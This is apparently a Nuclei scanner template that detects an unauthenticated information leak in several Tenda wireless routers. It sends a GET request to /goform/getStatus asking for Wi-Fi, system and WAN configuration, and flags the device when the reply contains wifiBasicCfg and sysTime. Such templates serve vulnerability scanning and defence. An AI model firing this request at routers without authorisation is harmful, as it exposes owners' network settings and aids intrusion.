id: Tenda-leakage
info:
  author: Str1am
  name: "\u817E\u8FBE\u591A\u6B3E\u65E0\u7EBF\u8DEF\u7531\u5668 getStatus \u53C2\u6570\
    \u5B58\u5728\u4FE1\u606F\u6CC4\u6F0F\u6F0F\u6D1E"
  severity: medium
  tags: Tenda,leakage
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - wifiBasicCfg
    - sysTime
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/goform/getStatus?random=&modules=internetStatus%2CdeviceStatistics%2CsystemInfo%2CwanAdvCfg%2CwifiRelay%2CwifiBasicCfg%2CsysTime'
